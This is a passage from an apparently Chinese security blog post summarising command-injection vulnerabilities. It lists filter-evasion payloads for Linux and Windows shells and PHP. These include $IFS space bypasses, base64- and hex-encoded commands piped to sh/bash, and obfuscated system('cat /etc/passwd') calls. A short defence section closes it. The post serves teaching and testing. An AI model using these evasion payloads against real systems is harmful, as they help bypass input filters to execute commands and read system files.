+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/015.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<h5 id="（4）空格绕过"><a href="#（4）空格绕过" class="headerlink" title="（4）空格绕过:"></a>（4）<strong>空格绕过:</strong></h5><table>
+<thead>
+<tr>
+<th>符号</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>$IFS</td>
+<td>Linux命令中默认指定space,tab,换行</td>
+</tr>
+<tr>
+<td>$IFS$1</td>
+<td>$IFS$1中的1可以用1-9代替。</td>
+</tr>
+<tr>
+<td>${IFS}</td>
+<td>同一</td>
+</tr>
+<tr>
+<td>&lt;</td>
+<td>比如cat&lt;shell.php，表示cat shell.php。</td>
+</tr>
+<tr>
+<td>&lt;&gt;</td>
+<td>比如cat&lt;&gt;shell.php，表示cat shell.php。</td>
+</tr>
+<tr>
+<td>{ , }</td>
+<td>用逗号代替空格，需要用{}括起来。</td>
+</tr>
+<tr>
+<td>X&#x3D;$’A\x20B’&amp;&amp;$X</td>
+<td>A为命令，B为参数，用\x20代替空格。</td>
+</tr>
+<tr>
+<td>%20</td>
+<td>php环境。</td>
+</tr>
+<tr>
+<td>%09</td>
+<td>php环境。</td>
+</tr>
+</tbody></table>
+<p>$IFS</p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/016.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<p>$IFS$1</p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/017.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/018.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<p>${IFS}</p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/019.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<p>&lt;	（后面只能跟直接参数，不能跟间接参数）</p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/020.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/021.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<p>{cat,shell.php}</p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/022.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<p>X&#x3D;$’A\x20B’&amp;&amp;$X</p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/023.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<h5 id="（5）关键字绕过"><a href="#（5）关键字绕过" class="headerlink" title="（5）关键字绕过:"></a>（5）<strong>关键字绕过:</strong></h5><p>1  <strong>基础:</strong><br>反斜线绕过:</p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/024.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<p>单引号绕过（必须成对出现）:</p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/025.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<p>双引号绕过（必须成对出现）:</p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/026.png" srcset="/img/loading.gif" lazyload class="" title="图片">	
+
+
+
+<p>反引号绕过（必须成对出现并且中间无内容）:</p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/027.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<p>base64编码绕过（d2hvYW1p是whoami的base64编码）:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> d2hvYW1p|<span class="hljs-built_in">base64</span> -d|sh<br><span class="hljs-built_in">echo</span> d2hvYW1p|<span class="hljs-built_in">base64</span> -d|bash<br></code></pre></td></tr></table></figure>
+
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/028.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/029.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<p>hex编码绕过（77686F616D69是whoami的hex编码）:</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">echo <span class="hljs-number">77686</span>F616D69|<span class="hljs-type">xxd</span> -r -p|<span class="hljs-type">bash</span><br></code></pre></td></tr></table></figure>
+
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/030.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<p>在没有传入参数的情况下,这些特殊字符默认为空:</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span>*<br><span class="hljs-symbol">$</span>@<br><span class="hljs-meta"><span class="hljs-keyword">$x</span>（x为1-9）</span><br><span class="hljs-symbol">$</span>&#123;x&#125;（x为任意正整数）<br></code></pre></td></tr></table></figure>
+
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/031.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/032.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/033.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/034.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<p>2.<strong>进阶:</strong><br>反引号的作用是把里面的内容当做命令执行。斜杠的作用是拼接。</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">666</span>`whoami`666<br><span class="hljs-number">666</span>`\whoami`666<br></code></pre></td></tr></table></figure>
+
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/035.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/036.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<ol start="3">
+<li><p><strong>进进阶</strong></p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/037.png" srcset="/img/loading.gif" lazyload class="" title="图片"></li>
+</ol>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/038.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/039.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+
+
+<p>   以上可用来绕过命令和文件名，以下仅绕文件名。</p>
+<ol start="4">
+<li><strong>文件名:</strong></li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>cat sh[efg]ll.php   匹配[efg]中任意一个字符:</th>
+</tr>
+</thead>
+</table>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/040.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<table>
+<thead>
+<tr>
+<th align="left">cat sh[a-z]ll.php   匹配[a-z]中任意一个字符:</th>
+</tr>
+</thead>
+</table>
+<p>​	</p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/041.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+
+<table>
+<thead>
+<tr>
+<th align="left">cat she*    匹配任意字符:</th>
+</tr>
+</thead>
+</table>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/042.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<table>
+<thead>
+<tr>
+<th align="left">a&#x3D;sh;b&#x3D;e;c&#x3D;ll;cat $a$b$c.php    内联执行:</th>
+</tr>
+</thead>
+</table>
+<p>​	</p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/043.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<p>   <code>	</code>正则表达式:</p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/044.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/045.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<h5 id="（6）函数名绕过"><a href="#（6）函数名绕过" class="headerlink" title="（6）函数名绕过:"></a>（6）<strong>函数名绕过:</strong></h5><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs scss"># 以<span class="hljs-built_in">system</span>()为例:<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cat /etc/passwd&quot;</span>)<br><br><span class="hljs-string">&quot;\x73\x79\x73\x74\x65\x6d&quot;</span>(<span class="hljs-string">&quot;cat /etc/passwd&quot;</span>);<br><br>(sy.(st)<span class="hljs-selector-class">.em</span>)(&quot;cat /etc/passwd&quot;);<br><br>&quot;system<span class="hljs-comment">/*fgnb*/</span>(&quot;cat /etc/passwd&quot;);&quot;<br><br>&quot;system<span class="hljs-comment">/*fgnb*/</span>(wh./*fgnb*/(oa)<span class="hljs-comment">/*fgnb*/</span><span class="hljs-selector-class">.mi</span>);&quot;<br><br>&quot;(sy./*fgnb*/(st)<span class="hljs-comment">/*fgnb*/</span><span class="hljs-selector-class">.em</span>)<span class="hljs-comment">/*fgnb*/</span>(wh./*fgnb*/(oa)<span class="hljs-comment">/*fgnb*/</span><span class="hljs-selector-class">.mi</span>);&quot;<br></code></pre></td></tr></table></figure>
+
+
+
+<h5 id="（7）斜杠绕过"><a href="#（7）斜杠绕过" class="headerlink" title="（7）斜杠绕过:"></a>（7）<strong>斜杠绕过:</strong></h5><p><code>	</code>${HOME:0:1}:</p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/046.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<p><strong>2.2  Windows:</strong></p>
+<ol>
+<li><h5 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title=" 逻辑运算符:"></a><code> </code><strong>逻辑运算符:</strong></h5><table>
+<thead>
+<tr>
+<th align="center"><strong>符号</strong></th>
+<th align="left"><strong>备注</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">｜</td>
+<td align="left">只执行后半部分。</td>
+</tr>
+<tr>
+<td align="center">｜｜</td>
+<td align="left">只有前半部分为假，才执行后半部分。</td>
+</tr>
+<tr>
+<td align="center">&amp;</td>
+<td align="left">都会执行后半部分。</td>
+</tr>
+<tr>
+<td align="center">&amp;&amp;</td>
+<td align="left">都为真才全部执行；前半部分为假，全部不执行；前半部分为真，后半部分为假，只执行前半部分。</td>
+</tr>
+</tbody></table>
+<p>|</p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/047.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<p>||</p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/048.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<p>&amp;</p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/049.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<p>&amp;&amp;</p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/050.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+</li>
+<li><h5 id="常用符号"><a href="#常用符号" class="headerlink" title="常用符号:"></a><strong>常用符号:</strong></h5><p>双引号 “</p>
+<p>转义号 ^</p>
+<table>
+<thead>
+<tr>
+<th align="left">“w”h”o”a”m”i”</th>
+</tr>
+</thead>
+</table>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/051.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<table>
+<thead>
+<tr>
+<th align="left">wh^oa^mi</th>
+</tr>
+</thead>
+</table>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/052.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<table>
+<thead>
+<tr>
+<th align="left">w””h^o^a”m”i     混合使用时需要注意转义号之前的双引号必须成对出现。</th>
+</tr>
+</thead>
+</table>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/053.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<table>
+<thead>
+<tr>
+<th align="left">(((w””h^o^a”m”i)))</th>
+</tr>
+</thead>
+</table>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/054.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+</li>
+<li><h5 id="set命令"><a href="#set命令" class="headerlink" title="set命令:"></a><strong>set命令:</strong></h5><p>用两个%括起来的变量,会输出变量的值：</p>
+<table>
+<thead>
+<tr>
+<th align="left">set a&#x3D;1 &#x2F;&#x2F;设置变量a，值为1<br>echo a &#x2F;&#x2F;此时输出结果为”a”<br>echo %a% &#x2F;&#x2F;此时输出结果为”1”</th>
+</tr>
+</thead>
+</table>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/055.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<p>利用：</p>
+<table>
+<thead>
+<tr>
+<th align="left">set a&#x3D;who<br>set b&#x3D;ami<br>%a%%b%<br>&#x2F;&#x2F;或者 call %a%%b%</th>
+</tr>
+</thead>
+</table>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/056.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+</li>
+<li><h5 id="切割字符"><a href="#切割字符" class="headerlink" title="切割字符:"></a><strong>切割字符:</strong></h5><table>
+<thead>
+<tr>
+<th align="left">set a&#x3D;whoami<br>%a:<del>0% &#x2F;&#x2F;切割所有<br>%a:</del>0,6% &#x2F;&#x2F;切割前6个字符<br>%a:~0,5% &#x2F;&#x2F;切割前6个字符，whoam不是系统命令，无法执行</th>
+</tr>
+</thead>
+</table>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/057.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<p>进阶：</p>
+<table>
+<thead>
+<tr>
+<th align="left">set a&#x3D;abc<br>who^%a:~0,1%mi</th>
+</tr>
+</thead>
+</table>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/058.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+</li>
+<li><h5 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过:"></a><strong>空格绕过:</strong></h5><p>CommonProgramFiles&#x3D;C:\Program Files\Common Files</p>
+<p>PROGRAMFILES&#x3D;”C:\Program Files”</p>
+<p>从CommonProgramFiles这个变量中截取，从第10个字符开始，截取后面一个字符，那这个空格就被截取到了(也就是Program和Files中间的那个空格)</p>
+<p>PROGRAMFILES同理</p>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/059.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<table>
+<thead>
+<tr>
+<th align="left">net%CommonProgramFiles:<del>10,-18%user<br>net%PROGRAMFILES:</del>10,-5%user</th>
+</tr>
+</thead>
+</table>
+<img src="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/060.png" srcset="/img/loading.gif" lazyload class="" title="图片">
+
+<h2 id="0x03-防御"><a href="#0x03-防御" class="headerlink" title="0x03  防御"></a><strong>0x03  防御</strong></h2></li>
+<li><p>采用白名单，或使用正则表达式进行过滤。</p>
+</li>
+<li><p>不要让用户可以直接控制system()、exec()、shell_exec()、passthru()等函数的参数。</p>
+</li>
+<li><p>在进入执行命令函数和方法前，对变量进行过滤，对敏感字符进行转义。</p>
+</li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>命令执行漏洞总结</div>
+      <div>http://example.com/2024/06/21/命令执行漏洞总结/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>CNAQ</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年6月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/06/20/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/" title="php代码审计基础">
+                        <span class="hidden-mobile">php代码审计基础</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
